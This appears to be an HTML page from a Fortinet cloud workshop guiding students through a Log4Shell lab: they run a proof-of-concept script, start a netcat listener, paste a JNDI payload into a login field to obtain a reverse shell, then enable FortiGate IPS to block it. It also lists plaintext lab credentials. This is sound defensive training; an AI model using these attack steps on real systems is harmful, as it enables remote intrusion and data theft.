@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.123.8">
+    <meta name="generator" content="Relearn 5.19.0+tip">
+    <meta name="description" content="FortiGate auto-scale and AWS GWLB">
+    <meta name="author" content="Fabio Gallego - Cloud CSE">
+    <title>3.3 IPS: Log4Shell attack :: FortiGate auto-scale and AWS GWLB</title>
+    <link href="https://fortilatam.github.io/tasks/43_log4shellattack.html" rel="canonical" type="text/html" title="3.3 IPS: Log4Shell attack :: FortiGate auto-scale and AWS GWLB">
+    <link href="/tasks/43_log4shellattack/index.xml" rel="alternate" type="application/rss+xml" title="3.3 IPS: Log4Shell attack :: FortiGate auto-scale and AWS GWLB">
+    <link href="/images/logo.svg?1710878531" rel="icon" type="image/svg+xml">
+    <!-- https://github.com/filamentgroup/loadCSS/blob/master/README.md#how-to-use -->
+    <link href="/css/fontawesome-all.min.css?1710878532" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1710878532" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1710878532" rel="stylesheet">
+    <link href="/css/auto-complete.css?1710878532" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1710878532" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1710878532" rel="stylesheet">
+    <link href="/css/fonts.css?1710878532" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1710878532" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1710878532" rel="stylesheet">
+    <link href="/css/theme-Workshop.css?1710878532" rel="stylesheet" id="variant-style">
+    <link href="/css/variant.css?1710878532" rel="stylesheet">
+    <link href="/css/print.css?1710878532" rel="stylesheet" media="print">
+    <link href="/css/format-print.css?1710878532" rel="stylesheet">
+    <link href="/css/ie.css?1710878532" rel="stylesheet">
+    <script src="/js/url.js?1710878532"></script>
+    <script src="/js/variant.js?1710878532"></script>
+    <script>
+      // hack to let hugo tell us how to get to the root when using relativeURLs, it needs to be called *url= for it to do its magic:
+      // https://github.com/gohugoio/hugo/blob/145b3fcce35fbac25c7033c91c1b7ae6d1179da8/transform/urlreplacers/absurlreplacer.go#L72
+      window.index_js_url="/index.search.js";
+      var root_url="/";
+      var baseUri=root_url.replace(/\/$/, '');
+      // translations
+      window.T_Copy_to_clipboard = 'Copy to clipboard';
+      window.T_Copied_to_clipboard = 'Copied to clipboard!';
+      window.T_Copy_link_to_clipboard = 'Copy link to clipboard';
+      window.T_Link_copied_to_clipboard = 'Copied link to clipboard!';
+      window.T_No_results_found = 'No results found for \u0022{0}\u0022';
+      window.T_N_results_found = '{1} results found for \u0022{0}\u0022';
+      // some further base stuff
+      var baseUriFull='https:\/\/fortilatam.github.io/';
+      window.variants && variants.init( [ 'Workshop' ] );
+    </script><style>
+  :root {
+     
+    --fortinet-white: 255, 255, 255;
+    --fortinet-black: 0, 0, 0;
+    --fortinet-red: 218, 41, 28;
+    --fortinet-blue: 48, 127, 226;
+    --fortinet-green: 72, 213, 151;
+    --fortinet-teel: 44, 204, 211;
+    --fortinet-purple: 144, 99, 205;
+    --fortinet-silver: 162, 178, 200;
+    --fortinet-silver-jeffMAC: 159, 178, 199;
+    --fortinet-silver70: 77, 92, 102;
+    --fortinet-lightgray: 228, 228, 228;
+    --fortinet-gray: 179, 179, 179;
+
+    --PRIMARY-color: rgb(var(--theme-color)) !important;
+    --MAIN-BG-color: rgb(var(--fortinet-white)) !important;
+    --MAIN-TEXT-color: rgb(var(--fortinet-black)) !important;
+    --MAIN-font: inter, sans-serif;
+
+    --MAIN-LINK-color: #1C90F3 !important;
+     
+    --LINK-HOVER-color: #167ad0 !important;
+     
+
+    --MENU-SECTIONS-ACTIVE-BG-color: rgb(var(--fortinet-black)) !important;
+    --MENU-SECTIONS-BG-color: #312525;
+     
+    --MENU-SECTIONS-LINK-color: #ccc !important;
+    --MENU-SECTIONS-LINK-HOVER-color: #e6e6e6 !important;
+     
+    --MENU-SECTION-ACTIVE-CATEGORY-color: #777;
+     
+    --MENU-SECTION-ACTIVE-CATEGORY-BG-color: #fff;
+     
+
+    --MENU-HEADER-BG-color: rgb(var(--theme-color)) !important;
+    --MENU-SEARCH-color: rgba(var(--fortinet-white)) !important;
+    --MENU-VISITED-color: rgb(var(--theme-color)) !important;
+
+     
+    --MENU-HOME-LINK-color: #ccc !important;
+     
+    --MENU-HOME-LINK-HOVER-color: rgba(var(--fortinet-white)) !important;
+     
+
+     
+    --BOX-WARNING-color: rgb(var(--fortinet-red)) !important;
+    --BOX-NOTE-color: rgb(var(--fortinet-teel)) !important;
+    --BOX-TIP-color: rgb(var(--fortinet-green)) !important;
+    --BOX-INFO-color: rgb(var(--fortinet-blue)) !important;
+
+     
+    --CODE-BLOCK-color: #e2e4e5 !important;
+     
+    --CODE-BLOCK-BG-color: rgb(var(--fortinet-gray)) !important;
+     
+    --CODE-BLOCK-BORDER-color: #282a36 !important;
+     
+
+     
+    --CODE-INLINE-color: #5e5e5e !important;
+     
+    --CODE-INLINE-BG-color: #fffae9 !important;
+     
+    --CODE-INLINE-BORDER-color: #f8e8c8 !important;
+     
+
+    --BROWSER-theme: light;
+     
+    --MERMAID-theme: default;
+     
+    --SWAGGER-theme: light;
+     
+  }
+
+  ::placeholder {
+     
+    color: rgb(var(--fortinet-white)) !important;
+    opacity: 1;
+     
+  }
+
+  :-ms-input-placeholder {
+     
+    color: rgb(var(--fortinet-white)) !important;
+  }
+
+  ::-ms-input-placeholder {
+     
+    color: rgb(var(--fortinet-white)) !important;
+  }
+
+  #title {
+    font-size: 1.5rem;
+    color: rgb(var(--fortinet-white)) !important;
+  }
+
+  #subtitle {
+    font-size: 1rem;
+     
+    color: rgb(var(--fortinet-white)) !important;
+  }
+
+  #sidebar .searchbox> :first-child,
+  #sidebar .searchbox button,
+  .searchbox span {
+    opacity: 1;
+  }
+
+  .searchbox {
+    border: 1px solid rgba(var(--theme-color), .85) !important;
+  }
+
+  .searchbox input {
+    background: rgba(var(--theme-color), .75) !important;
+  }
+
+  #header #logo {
+    display: flex;
+    justify-content: space-around;
+    flex-direction: column;
+  }
+
+  @media screen and (min-width: 1300px) {
+
+     
+    #body .flex-block-wrapper {
+      margin-left: auto;
+      margin-right: auto;
+      max-width: 1300px;
+      width: 100%;
+    }
+  }
+</style>
+  </head>
+  <body class="mobile-support print" data-url="/tasks/43_log4shellattack.html">
+    <div id="body" class="default-animation">
+      <div id="sidebar-overlay"></div>
+      <div id="toc-overlay"></div>
+      <nav id="topbar" class="highlightable">
+        <div>
+          <div id="breadcrumbs">
+            <span id="sidebar-toggle-span">
+              <a href="#" id="sidebar-toggle" class="topbar-link" title='Menu (CTRL+ALT+n)'><i class="fas fa-bars fa-fw"></i></a>
+            </span>
+            <ol class="links" itemscope itemtype="http://schema.org/BreadcrumbList">
+              <li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><a itemprop="item" href="/index.html"><span itemprop="name">1. Introduction</span></a><meta itemprop="position" content="1"> &gt; </li>
+              <li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><a itemprop="item" href="/tasks.html"><span itemprop="name">3. Tasks</span></a><meta itemprop="position" content="2"> &gt; </li>
+              <li itemscope itemtype="https://schema.org/ListItem" itemprop="itemListElement"><span itemprop="name">3.3 IPS: Log4Shell attack</span><meta itemprop="position" content="3"></li>
+            </ol>
+          </div>
+        </div>
+      </nav>
+      <main id="body-inner" class="highlightable default" tabindex="-1">
+        <div class="flex-block-wrapper">
+          <article class="default">
+            <header class="headline">
+            </header>
+<h1 id="33-ips-log4shell-attack">3.3 IPS: Log4Shell attack</h1>
+
+<p><a href="https://en.wikipedia.org/wiki/Log4Shell" target="_blank">Log4Shell is a zero-day</a> vulnerability with a CVSS severity rating of 10 and it was largely explored few years ago&hellip; and continues to these days. In this lab you will perform some attacks and block it using FGT.</p>
+<ol>
+<li>
+<p>The first thing we need to do is to start a Docker container with the vulnerable application</p>
+</li>
+<li>
+<p>In AWS console, go to EC2 menu and click on &ldquo;Instances&rdquo;</p>
+</li>
+<li>
+<p>Click &ldquo;wk-spk1-pub-a&rdquo; and then click &ldquo;Connect&rdquo;
+
+<a href="#image-12412fea20a752bc1a55bc05692b07ae" class="lightbox-link">
+<img src="/tasks/43_log4shellattack.html/4_image1.png" alt="4 image1" style="height: auto; width: auto;" loading="lazy">
+</a>
+<a href="javascript:history.back();" class="lightbox" id="image-12412fea20a752bc1a55bc05692b07ae">
+<img src="/tasks/43_log4shellattack.html/4_image1.png" alt="4 image1" class="lightbox-image" loading="lazy">
+</a></p>
+</li>
+<li>
+<p>Click &ldquo;EC2 serial console&rdquo; and then &ldquo;Connect&rdquo;
+
+<a href="#image-926846497c60a3216fd69a80848ab5b0" class="lightbox-link">
+<img src="/tasks/43_log4shellattack.html/4_image2.png" alt="4 image2" style="height: auto; width: auto;" loading="lazy">
+</a>
+<a href="javascript:history.back();" class="lightbox" id="image-926846497c60a3216fd69a80848ab5b0">
+<img src="/tasks/43_log4shellattack.html/4_image2.png" alt="4 image2" class="lightbox-image" loading="lazy">
+</a></p>
+</li>
+<li>
+<p>The login information is:</p>
+</li>
+</ol>
+<p>user: <strong><code>student</code></strong>
+password: <strong><code>F0rt1n3t</code></strong></p>
+<ol start="6">
+<li>Inside the console, run the following command:</li>
+</ol>
+<p><strong><code>docker run --network host -t -i log4j-shell-poc</code></strong></p>
+<p>
+<a href="#image-7acd5d4e12fcd520232ad1cc47f6c556" class="lightbox-link">
+<img src="/tasks/43_log4shellattack.html/4_image17.png" alt="4 image17" style="height: auto; width: auto;" loading="lazy">
+</a>
+<a href="javascript:history.back();" class="lightbox" id="image-7acd5d4e12fcd520232ad1cc47f6c556">
+<img src="/tasks/43_log4shellattack.html/4_image17.png" alt="4 image17" class="lightbox-image" loading="lazy">
+</a>
+7. Copy its PublicIPs. The application URL (<em><strong>Log4ShellAPPURL</strong></em>) will be http://PublicIPs:8080. In this example: http://54.221.177.198:8080
+
+<a href="#image-af552a38e1fd805e2f88209c540485a1" class="lightbox-link">
+<img src="/tasks/43_log4shellattack.html/4_image18.png" alt="4 image18" style="height: auto; width: auto;" loading="lazy">
+</a>
+<a href="javascript:history.back();" class="lightbox" id="image-af552a38e1fd805e2f88209c540485a1">
+<img src="/tasks/43_log4shellattack.html/4_image18.png" alt="4 image18" class="lightbox-image" loading="lazy">
+</a>
+8.  Access <strong>Pub-EC2</strong> using <strong>Microsoft Remote Desktop Connection</strong> (or equivalent) with the public IP shown on: AWS Console &gt; EC2 &gt; Instances &gt; Click <em><strong>Pub-EC2</strong></em> &gt; Public IPv4 address</p>
+<p>
+<a href="#image-8b1c6db1b65a0c9a2e8fc140139048fa" class="lightbox-link">
+<img src="/tasks/43_log4shellattack.html/4_image16.png" alt="4 image16" style="height: auto; width: auto;" loading="lazy">
+</a>
+<a href="javascript:history.back();" class="lightbox" id="image-8b1c6db1b65a0c9a2e8fc140139048fa">
+<img src="/tasks/43_log4shellattack.html/4_image16.png" alt="4 image16" class="lightbox-image" loading="lazy">
+</a></p>
+<ol start="9">
+<li>To login, use the credentials below:</li>
+</ol>
+<p>user: <strong><code>student</code></strong>
+password: <strong><code>F0rt1n3t</code></strong></p>
+
+<div class="box notices cstyle warning">
+  <div class="box-label"><i class="fa-fw fas fa-exclamation-triangle"></i> Warning</div>
+  <div class="box-content">
+
+<p>If shown another screen with &ldquo;Authentication Required&rdquo; and Ubuntu user, just click &ldquo;Cancel&rdquo;</p>
+</div>
+</div>
+<ol start="10">
+<li>
+<p>Click the 9-dots square to open Firefox (if you dont see the dots, click on &ldquo;Activities&rdquo;)
+
+<a href="#image-91305715109d5023ea209a437afa9d26" class="lightbox-link">
+<img src="https://raw.githubusercontent.com/FortiLatam/aws-ql-netsec-pub/main/media/image22.png" alt="" style="height: auto; width: auto;" loading="lazy">
+</a>
+<a href="javascript:history.back();" class="lightbox" id="image-91305715109d5023ea209a437afa9d26">
+<img src="https://raw.githubusercontent.com/FortiLatam/aws-ql-netsec-pub/main/media/image22.png" alt="" class="lightbox-image" loading="lazy">
+</a></p>
+</li>
+<li>
+<p>Use Firefox address bar to access the <strong>Log4ShellAPPURL</strong></p>
+</li>
+<li>
+<p>You should have accessed the application. Keep this Firefox window open. The application can be slightly different from the image below</p>
+</li>
+<li>
+<p>Click &ldquo;<strong>activities</strong>&rdquo; menu at upper left &gt; 9-dots square &gt; Terminal</p>
+</li>
+</ol>
+<p>
+<a href="#image-61d1ea4edb6e2c0aa868a6a2f9144376" class="lightbox-link">
+<img src="https://raw.githubusercontent.com/FortiLatam/aws-ql-netsec-pub/main/media/image24.png" alt="" style="height: auto; width: auto;" loading="lazy">
+</a>
+<a href="javascript:history.back();" class="lightbox" id="image-61d1ea4edb6e2c0aa868a6a2f9144376">
+<img src="https://raw.githubusercontent.com/FortiLatam/aws-ql-netsec-pub/main/media/image24.png" alt="" class="lightbox-image" loading="lazy">
+</a>
+14.  Inside terminal window type:</p>
+<p><strong><code>cd log4j-shell-poc</code></strong>
+<strong><code>python3 poc.py \--userip \&lt;PUBLIC_IP\&gt; \--webport 8000 \--lport 9001</code></strong></p>
+
+<div class="box notices cstyle default">
+  <div class="box-label"></div>
+  <div class="box-content">
+
+<p>PUBLIC_IP is the public IP you used to connect to Remote Desktop. You can see it in the &ldquo;title bar&rdquo; from remote desktop app, example in the screenshots 52.91.129.42</p>
+</div>
+</div>
+<ol start="15">
+<li>
+<p>Press <strong>enter</strong></p>
+</li>
+<li>
+<p>You should see a string starting with ${jndi://ldap&hellip;&hellip;. Copy it
+
+<a href="#image-6b64c290b8cbcfa19fb9e32d4d6111f5" class="lightbox-link">
+<img src="https://raw.githubusercontent.com/FortiLatam/aws-ql-netsec-pub/main/media/image25.png" alt="" style="height: auto; width: auto;" loading="lazy">
+</a>
+<a href="javascript:history.back();" class="lightbox" id="image-6b64c290b8cbcfa19fb9e32d4d6111f5">
+<img src="https://raw.githubusercontent.com/FortiLatam/aws-ql-netsec-pub/main/media/image25.png" alt="" class="lightbox-image" loading="lazy">
+</a></p>
+</li>
+<li>
+<p>Open a new tab in the terminal window and type:</p>
+</li>
+</ol>
+<p><strong><code>nc -lvnp 9001</code></strong></p>
+<ol start="18">
+<li>
+<p>Press <strong>enter</strong>. It starts the <strong>netcat</strong></p>
+</li>
+<li>
+<p>Leave the terminal window opened</p>
+</li>
+<li>
+<p>Go to the Firefox browser and paste the string copied from step 16 in the <strong>Username</strong> field</p>
+</li>
+<li>
+<p>In the password you can type anything, example: password</p>
+</li>
+<li>
+<p>Click <strong>Login</strong></p>
+</li>
+<li>
+<p>In the terminal window (with netcat running) you should see a message &ldquo;Connection received on &hellip;&rdquo;</p>
+</li>
+<li>
+<p>This means you got remote shell!</p>
+</li>
+<li>
+<p>This terminal window (with netcat running) is now the shell from the pod running the application. You can do whatever you want, as you are&hellip; if you type <strong>whoami</strong> and press <strong>enter</strong> in the terminal you&rsquo;ll know&hellip;</p>
+</li>
+<li>
+<p>Now you are inside, as an attacker, you could perform a lot of attacks, data exfiltration, lateral movement and many other dangerous activities</p>
+</li>
+</ol>
+
+<div class="box notices cstyle warning">
+  <div class="box-label"><i class="fa-fw fas fa-exclamation-triangle"></i> Warning</div>
+  <div class="box-content">
+
+<p><strong>Note</strong>: You used a EC2 in other VPC, the access from this EC2 don&rsquo;t go through FortiGate and you also used the external (public) IP, so it could be done from any other machine in the internet</p>
+</div>
+</div>
+<ol start="27">
+<li>Press <em><strong>CTRL+C</strong></em> to stop netcat</li>
+<li>You will block this attack with FortiGate. To do so, you will enable the IPS profile</li>
+<li>Go to FortiGate GUI</li>
+<li>To access FortiGate, open AWS Console &gt; EC2 &gt; Instances &gt; click on FortiGate instance (fgt_byol_asg). To see the FortiGate public IP, select the FortiGate, then click &ldquo;Networking&rdquo; tab and scroll down:</li>
+</ol>
+<p>
+<a href="#image-04df583dcd6b55121dd624f4835053c0" class="lightbox-link">
+<img src="/tasks/43_log4shellattack.html/4_image5.png" alt="4 image5" style="height: auto; width: auto;" loading="lazy">
+</a>
+<a href="javascript:history.back();" class="lightbox" id="image-04df583dcd6b55121dd624f4835053c0">
+<img src="/tasks/43_log4shellattack.html/4_image5.png" alt="4 image5" class="lightbox-image" loading="lazy">
+</a></p>
+<ol start="30">
+<li>
+<p>Copy this IP and in a new browser tab, paste it to access FortiGate GUI.</p>
+</li>
+<li>
+<p>FortiGate credentials are in Sharepoint page</p>
+</li>
+<li>
+<p>Change the firewall policy named <strong>Rule for Log4J testing</strong> to be exactly as shown below:
+
+<a href="#image-37d6e89fe90f4125f7e852f50e91927b" class="lightbox-link">
+<img src="/tasks/43_log4shellattack.html/4_image19.png" alt="4 image19" style="height: auto; width: auto;" loading="lazy">
+</a>
+<a href="javascript:history.back();" class="lightbox" id="image-37d6e89fe90f4125f7e852f50e91927b">
+<img src="/tasks/43_log4shellattack.html/4_image19.png" alt="4 image19" class="lightbox-image" loading="lazy">
+</a></p>
+</li>
+<li>
+<p>Now, try to perform the same attack again. If you don&rsquo;t remember, go back 14</p>
+</li>
+<li>
+<p>Different from earlier, now you should not see any connection in your netcat terminal. Go check FortiGate logs
+
+<a href="#image-a4891328ead9dd1cf296d0e08195d3d5" class="lightbox-link">
+<img src="https://raw.githubusercontent.com/FortiLatam/aws-ql-netsec-pub/main/media/image29.png" alt="" style="height: auto; width: auto;" loading="lazy">
+</a>
+<a href="javascript:history.back();" class="lightbox" id="image-a4891328ead9dd1cf296d0e08195d3d5">
+<img src="https://raw.githubusercontent.com/FortiLatam/aws-ql-netsec-pub/main/media/image29.png" alt="" class="lightbox-image" loading="lazy">
+</a></p>
+</li>
+<li>
+<p>Inside <strong>Logs &amp; Report &gt; Security Events &gt; Intrusion Prevention</strong> you will find the log entry blocking Log4Shell.</p>
+</li>
+<li>
+<p><strong>Lab complete!</strong></p>
+</li>
+</ol>
+
+            <footer class="footline">
+
+            </footer>
+          </article>
+
+        </div>
+      </main>
+    </div>
+    <script src="/js/clipboard.min.js?1710878532" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1710878532" defer></script>
+    <script src="/js/theme.js?1710878532" defer></script>
+  </body>
+</html>
